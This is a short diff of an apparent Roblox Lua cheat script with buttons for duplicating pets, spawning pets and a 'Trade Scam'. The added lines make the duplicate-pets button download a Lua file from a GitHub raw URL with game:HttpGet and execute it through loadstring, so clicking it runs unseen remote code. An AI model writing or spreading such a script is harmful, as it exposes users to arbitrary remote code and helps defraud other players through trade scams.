@@ -71,6 +71,8 @@ local function runTradeScam()
 end
 
 -- Create the buttons
-createButton("🐾 Duplicate Pets", 20, runDuplicatePets)
+createButton("🐾 Duplicate Pets", 20, function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/adptmescrtips/refs/heads/main/duplicate_pets.lua"))()
+end)
 createButton("🐶 Pet Spawner", 80, runPetSpawner)
 createButton("💰 Trade Scam", 140, runTradeScam)
